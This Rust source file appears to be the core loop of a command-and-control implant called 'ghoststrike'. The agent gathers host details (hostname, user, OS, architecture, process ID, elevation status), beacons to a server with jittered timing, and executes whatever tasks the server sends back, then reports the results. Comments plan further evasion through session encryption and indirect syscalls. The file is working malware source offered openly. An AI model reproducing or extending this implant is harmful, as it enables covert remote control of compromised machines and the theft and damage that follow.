use anyhow::Result;
use chrono::Utc;
use rand::Rng;
use tracing::info;
use uuid::Uuid;

use ghoststrike_common::{AgentCheckinReq, AgentCheckinResp, AgentInfo};

use crate::comms::Transport;
use crate::config::AgentConfig;
use crate::tasks::execute_task;

pub async fn run(cfg: AgentConfig) -> Result<()> {
    let agent_id = Uuid::new_v4();
    let transport = Transport::new(&cfg)?;

    loop {
        // Collect host info
        let info = collect_host_info(agent_id, &cfg).await;

        // Checkin
        let req = AgentCheckinReq {
            agent_id,
            info,
            encrypted: vec![], // Phase 2: encrypt with session key
        };

        match transport.checkin(&req).await {
            Ok(resp) => {
                // Execute pending tasks
                for task in resp.tasks {
                    let result = execute_task(&task).await;
                    let _ = transport.report_task(agent_id, &task, result).await;
                }

                // Jittered sleep
                let sleep = jittered_sleep(resp.sleep_ms, resp.jitter_pct);
                tokio::time::sleep(tokio::time::Duration::from_millis(sleep)).await;
            }
            Err(e) => {
                // Back-off on failure
                let backoff = jittered_sleep(cfg.sleep_ms * 3, cfg.jitter_pct);
                tokio::time::sleep(tokio::time::Duration::from_millis(backoff)).await;
            }
        }
    }
}

async fn collect_host_info(agent_id: Uuid, cfg: &AgentConfig) -> AgentInfo {
    use uuid::Uuid;

    AgentInfo {
        id:           agent_id,
        hostname:     hostname(),
        username:     username(),
        os_version:   os_version(),
        arch:         std::env::consts::ARCH.to_string(),
        pid:          std::process::id(),
        elevated:     is_elevated(),
        last_seen:    Utc::now(),
        listener_id:  Uuid::nil(), // server fills this
        sleep_ms:     cfg.sleep_ms,
        jitter_pct:   cfg.jitter_pct,
        build_id:     cfg.build_id.clone(),
    }
}

fn jittered_sleep(sleep_ms: u64, jitter_pct: u8) -> u64 {
    let mut rng = rand::thread_rng();
    let jitter = (sleep_ms * jitter_pct as u64) / 100;
    let delta   = rng.gen_range(0..=jitter);
    if rng.gen_bool(0.5) { sleep_ms + delta } else { sleep_ms.saturating_sub(delta) }
}

fn hostname() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var("COMPUTERNAME").unwrap_or_else(|_| "UNKNOWN".into())
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("HOSTNAME")
            .or_else(|_| {
                std::fs::read_to_string("/etc/hostname").map(|s| s.trim().to_string())
            })
            .unwrap_or_else(|_| "UNKNOWN".into())
    }
}

fn username() -> String {
    #[cfg(target_os = "windows")]
    {
        std::env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
    }
    #[cfg(not(target_os = "windows"))]
    {
        std::env::var("USER")
            .or_else(|_| std::env::var("LOGNAME"))
            .unwrap_or_else(|_| "unknown".into())
    }
}

fn os_version() -> String {
    #[cfg(target_os = "windows")]
    {
        // Phase 2: use RtlGetVersion via indirect syscall for accurate ver.
        "Windows".into()
    }
    #[cfg(not(target_os = "windows"))]
    {
        "Linux".into()
    }
}

fn is_elevated() -> bool {
    #[cfg(target_os = "windows")]
    {
        use windows_sys::Win32::Security::{GetTokenInformation, TokenElevation, TOKEN_ELEVATION};
        use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
        use windows_sys::Win32::Foundation::HANDLE;
        use windows_sys::Win32::Security::TOKEN_QUERY;

        unsafe {
            let mut token: HANDLE = 0;
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
                return false;
            }
            let mut elev = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut ret_len = 0u32;
            let ok = GetTokenInformation(
                token,
                TokenElevation,
                &mut elev as *mut _ as *mut _,
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut ret_len,
            );
            ok != 0 && elev.TokenIsElevated != 0
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        false
    }
}
